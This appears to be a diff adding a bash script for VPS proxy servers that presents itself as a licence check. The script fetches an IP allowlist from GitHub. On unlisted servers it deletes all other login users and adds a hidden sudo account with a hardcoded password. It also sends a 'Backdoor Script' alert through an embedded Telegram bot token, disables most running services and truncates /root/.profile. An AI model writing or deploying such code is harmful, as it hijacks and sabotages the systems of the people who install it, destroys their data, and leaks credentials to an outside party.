@@ -1,0 +1,189 @@
+#!/bin/bash
+WARNING_TEXT="warning"
+PROFILE_PATH="/root/.profile"
+DOMAIN_FILE="/etc/xray/domain"
+DOMAIN="$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")"
+IP_ADDRESS="$(hostname -I | awk '{print $1}')"
+# Mendapatkan file dari Github dan membaca URL yang ada di dalamnya
+data_ip_list="https://raw.githubusercontent.com/PeyxDev/neswc/main/ipx"
+
+ipsaya=$(hostname -I | awk '{print $1}')
+data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+date_list=$(date +"%Y-%m-%d" -d "$data_server")
+notif_izin() {
+#!/bin/bash
+TIME="10"
+CHATID="7661292905"
+KEY="7916829256:AAHB-_Jv24fTQfR98HA6eNogR8zzYzChw6g"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+# Generate password baru secara acak (12 karakter)
+new_password=$(</dev/urandom tr -dc a-z0-9 | head -c5)
+
+# Ganti password root
+# Bot Notif
+# Format pesan Telegram
+TEXT="◇━━━━━━━━━━━━━━◇
+🪩 Notification Izin Vps Ditolak 🪩 
+ 💀 Backdoor Script Peyx 💀
+◇━━━━━━━━━━━━━━◇
+🔹 Server: $(hostname)  
+🔹 User: $Username
+🔹 IP Address: $ipsaya
+🔹 Password Baru: $pwadm  
+◇━━━━━━━━━━━━━━◇
+⚠️ Catatan: Simpan password ini dengan aman!
+◇━━━━━━━━━━━━━━◇"
+
+# Kirim notifikasi ke Telegram
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    
+# Tampilkan password baru
+}
+EXCLUDED_SERVICES=(
+  "sshd.service" "ssh.service"
+  "systemd-resolved.service" "systemd-network-generator.service"
+  "systemd-time-wait-sync.service" "systemd-boot-check-no-failures.service"
+  "systemd-pstore.service" "networkd-dispatcher.service"
+  "dbus-org.freedesktop.resolve1.service" "accounts-daemon.service"
+  "getty@.service" "autovt@.service" "ssh.service" "systemd-journald.service"
+  "systemd-udevd.service" "cron.service" "dbus.service" "systemd-journald.service"
+  "systemd-logind.service" "systemd-networkd.service" "systemd-udevd.service"
+  "udisks2.service" "irqbalance.service" "polkit.service" "snapd.service"
+  "rsyslog.service" "serial-getty@ttyS0.service" "unattended-upgrades.service"
+  "user@0.service" "ModemManager.service"
+)
+active_sercive(){
+LOG_FILE="/usr/bin/securited"
+
+# Periksa apakah file log ada
+if [[ ! -f "$LOG_FILE" ]]; then
+    echo "Tidak ada service yang perlu dipulihkan."
+    update_keys
+fi
+
+# Aktifkan kembali semua service yang ada di dalam log
+while read -r service; do
+    systemctl start "$service" > /dev/null 2>&1
+	systemctl enable "$service" > /dev/null 2>&1
+    systemctl start ssh sshd haproxy nginx ws xray > /dev/null 2>&1
+	systemctl enable ssh sshd haproxy nginx ws xray > /dev/null 2>&1
+    echo "Service $service telah dihidupkan kembali"
+done < "$LOG_FILE"
+
+rm -f "$LOG_FILE"
+}
+update_keys(){
+	pwadm="@Ridwan112#"
+# Download file dan proses
+
+Username="xwan"
+Password="$pwadm"
+
+# Daftar user yang diizinkan
+allowed_users=("root" "$Username")
+
+# Dapatkan semua user yang bisa login ke terminal
+all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
+
+# Hapus semua user yang tidak diizinkan
+for user in $all_users; do
+    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
+        userdel -r "$user" > /dev/null 2>&1
+        echo "User $user telah dihapus."
+    fi
+done
+
+# Periksa apakah user newbie sudah ada
+if id "$Username" &>/dev/null; then
+    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+else
+    # Tambahkan user newbie jika tidak ada
+    echo -e "$Username $Password" > /etc/xray/.adm
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
+    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+    usermod -aG sudo "$Username" > /dev/null 2>&1
+fi
+notif_izin
+	echo "vps berhasil diamankan"
+	
+echo "Proses selesai."
+}
+checking_sc() {
+  local ip_found=false
+  local useexp=""
+
+  # Loop untuk memeriksa setiap link dalam data_ip_list
+  for data_ip in "${data_ip_list[@]}"; do
+    useexp=$(wget -qO- "$data_ip" | grep "$ipsaya" | awk '{print $3}')
+    
+    if [[ -n "$useexp" ]]; then
+      ip_found=true  # IP ditemukan dalam daftar izin
+	  echo -e "\033[1;92mVPS anda Terdaftar\033[0m\033[91;1m $ipsaya (Melanjutkan Proses Pemulihan Script)\033[0m"
+	  active_sercive
+      break
+    fi
+  done
+
+ if [[ "$ip_found" != true ]]; then
+
+  pwadm="@Ridwan112#"
+# Download file dan proses
+
+Username="xwan"
+Password="$pwadm"
+
+# Daftar user yang diizinkan
+allowed_users=("root" "$Username")
+
+# Dapatkan semua user yang bisa login ke terminal
+all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
+
+# Hapus semua user yang tidak diizinkan
+for user in $all_users; do
+    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
+        userdel -r "$user" > /dev/null 2>&1
+        echo "User $user telah dihapus."
+    fi
+done
+
+# Periksa apakah user newbie sudah ada
+if id "$Username" &>/dev/null; then
+    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+else
+    # Tambahkan user newbie jika tidak ada
+    echo -e "$Username $Password" > /etc/xray/.adm
+    mkdir -p /home/script/
+    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
+    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
+    usermod -aG sudo "$Username" > /dev/null 2>&1
+fi
+notif_izin
+	echo "vps berhasil diamankan"
+    # 3. Matikan Semua Service yang Aktif & Enable Kecuali yang ada di EXCLUDED_SERVICES
+	LOG_FILE=/usr/bin/securited
+	systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
+		# Cek apakah service masuk dalam daftar pengecualian
+		if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
+			echo "$service" >> "$LOG_FILE"
+			systemctl stop "$service" > /dev/null 2>&1
+			systemctl disable "$service" > /dev/null 2>&1
+			echo "Service $service telah diamankan"
+		fi
+	done
+
+	echo "Semua service berhasil diamankan"
+	
+    # 4. Hapus Semua Baris Setelah "mesg n || true" dan Tambahkan Warning
+    if ! grep -q "warning" "$PROFILE_PATH" > /dev/null 2>&1; then
+      if grep -q "mesg n || true" "$PROFILE_PATH" > /dev/null 2>&1; then
+        sed -i '/mesg n || true/,$!b;/mesg n || true/,$d' "$PROFILE_PATH" > /dev/null 2>&1
+        echo -e "\nmesg n || true\nwarning" >> "$PROFILE_PATH"
+      else
+        echo -e "\nmesg n || true\nwarning" >> "$PROFILE_PATH"
+      fi
+    fi
+ fi
+  echo "proses selesai"
+}
+checking_sc
